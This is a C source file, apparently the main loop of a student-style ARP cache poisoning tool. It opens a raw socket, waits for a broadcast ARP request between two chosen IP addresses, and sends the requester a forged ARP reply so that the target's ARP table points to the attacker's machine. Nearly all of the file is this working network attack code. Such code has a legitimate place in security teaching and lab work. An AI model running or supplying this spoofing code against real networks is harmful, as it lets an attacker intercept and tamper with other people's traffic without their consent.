#include "malcolm.h"

int main(int argc, char *argv[]) 
{
    struct Malcolm malcolm;
    char buffer[1024];

    //check parsing of arguments and fill ip address
    if(!verify_arguments(argc, argv, &malcolm))
        return(1);

    // Get IP and MAC of the poisoning computer
    if(!get_interface(&malcolm))
    {
        printf("No matching interface found for the given IP addresses.\n");
        freeifaddrs(malcolm.ifaddr);
        return(1);
    }

    // SOCK_RAW for direct packet manipulation
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(sockfd < 0)
    {
        printf("error socket: %s",strerror(errno));
        freeifaddrs(malcolm.ifaddr);
        return(errno);
    }
    

    printf("listening...\n");
    while(1) {
        ssize_t packet_len = recvfrom(sockfd, buffer, sizeof(buffer), 0, NULL, NULL);

        if(packet_len == -1) {
            perror("Packet receive failed");
            continue;
        }

        // cast the buffer from the actual packet into an eth structure
        struct ethhdr *eth = (struct ethhdr *)buffer;
        //check if its an ARP packet
        if(ntohs(eth->h_proto) == ETH_P_ARP) 
        {
            //create an arp_header skipping the ethernet header
            struct  arp_header *arp = (struct arp_header *)(buffer + sizeof(struct ethhdr));
            unsigned int uintsrc, uinttarg;
            ft_memcpy(&uinttarg, arp->target_ip, 4);
            ft_memcpy(&uintsrc, arp->sender_ip, 4);

            printf("Received ARP packet of size %ld: SRC IP %d.%d.%d.%d -> TARG IP %d.%d.%d.%d\n",
                packet_len, arp->sender_ip[0], arp->sender_ip[1], arp->sender_ip[2], arp->sender_ip[3],
                arp->target_ip[0], arp->target_ip[1], arp->target_ip[2], arp->target_ip[3]);

            if(eth->h_dest[0] == 0xFF && eth->h_dest[1] == 0xFF && eth->h_dest[2] == 0xFF &&
                eth->h_dest[3] == 0xFF && eth->h_dest[4] == 0xFF && eth->h_dest[5] == 0xFF)
            {
                printf("Broadcast ARP Request detected.\n");
                if(uintsrc == malcolm.srcaddr.sin_addr.s_addr && uinttarg == malcolm.targetaddr.sin_addr.s_addr) // detection de l'addresse ip source et dest corresponsant aux argv
                {
                    // create ARP response
                    unsigned char *buffersend = create_arp_response(malcolm, eth, arp);
                    if (!buffersend) {
                        printf("Error creating ARP response: %s\n", strerror(errno));
                        continue;
                    }
                    // create the destination address struct
                    struct sockaddr_ll address_response = {0};
                    fill_sockaddr_ll(&address_response, malcolm.index_interface, eth->h_source);

                    //sending response
                    printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
                    int size = sendto(sockfd, buffersend, 42, 0, (struct sockaddr *)&address_response, sizeof(address_response));
                    if(size < 0){
                        printf("Error sending packet: %s\n", strerror(errno));
                        free(buffersend);
                        continue;
                    }
                    else
                    {
                        printf("Exiting Program.\n");
                        close(sockfd);
                        free(buffersend);
                        freeifaddrs(malcolm.ifaddr);
                        return 0;
                    }
                }
            }
        }
    }
    close(sockfd);
    freeifaddrs(malcolm.ifaddr);
    return(1);
}
